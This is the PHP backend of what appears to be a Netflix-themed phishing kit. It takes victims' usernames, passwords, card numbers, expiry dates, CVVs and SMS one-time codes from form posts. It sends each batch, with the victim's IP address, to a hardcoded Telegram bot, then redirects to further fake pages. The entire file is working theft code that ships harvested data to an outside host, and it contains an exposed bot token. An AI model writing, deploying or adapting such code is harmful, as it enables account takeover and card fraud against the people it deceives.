<?php 
session_start();
require 'config.php';


function sendTotelegram($data){
    $botToken = "8696033303:AAFFPZRC09ttr2m2IaMT622C7vsI30G4zPo";
    $chatId = "5960684871";

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot8696033303:AAFFPZRCO9ttr2m2IaMT622C7vsI3OG4zPo/sendMessage?chat_id=$5960684871&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['user'])){

$msg = "
NETFLIX- New Log 
--------------------------
User: ".$_POST['user']."
pass: ".$_POST['pass']."
--------------------------
IP: $ip
";

sendTotelegram($msg);
header("location: card.php");

}


$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
NETFLIX- New CC 
--------------------------
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
holder-name: ".$_POST['holder-name']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: wait.php?next=sms.php");
    
}
    


if(isset($_POST['otp'])){

$msg = "
NETFLIX - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php?error");

}
    

if(@$msg!=""){
    $bm->logTXT($msg);
}



?>